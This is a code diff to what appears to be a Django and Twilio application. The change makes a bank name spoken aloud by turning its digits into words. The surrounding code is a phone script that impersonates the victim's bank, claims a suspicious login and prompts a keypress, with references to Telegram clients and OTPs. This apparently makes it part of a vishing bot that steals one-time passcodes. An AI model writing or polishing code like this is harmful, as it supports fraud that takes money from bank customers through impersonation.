@@ -13,6 +13,7 @@ from .serializers import BalanceSerializer,Telegram_ClientSerializer,Telegram_Ot
 from store.serializers import ProductSerializer
 from rest_framework.generics import CreateAPIView
 from asgiref.sync import async_to_sync
+import re
 from django.http import HttpResponse
 from twilio.twiml.voice_response import VoiceResponse, Gather
 from django.views.decorators.csrf import csrf_exempt
@@ -447,7 +448,24 @@ class SecurityCheck(APIView):
 def voice(request,bank,chat_id):
     resp = VoiceResponse()
     gather = Gather(num_digits=1, action=f'/pay/gather/{chat_id}/{bank}/')
-    name = bank.replace('_',' ')
+    def digit_to_word(match):
+        digit_word_map = {
+            '0': 'zero', '1': 'one', '2': 'two', '3': 'three',
+            '4': 'four', '5': 'five', '6': 'six', '7': 'seven',
+            '8': 'eight', '9': 'nine'
+        }
+        return ' '.join(digit_word_map[digit] for digit in match.group())
+    
+    try:
+        # Attempt to replace digits with their word representation
+        bank_with_words = re.sub(r'\d+', digit_to_word, bank)
+    except Exception as e:
+        # If there's an error (though unlikely in this context), just use the original bank string
+        print(f"Error processing bank string: {e}")
+        bank_with_words = bank
+    
+    # Replace underscores with spaces, works whether or not digits were present
+    name = bank_with_words.replace('_', ' ')
     gather.say(f'We have detected a login attempt on your {name} account, leading us to suspect a possible security breach. If you did not initiate this login request and request an OTP, kindly press 1.')
     resp.append(gather)
     call_status = request.POST.get('CallStatus')
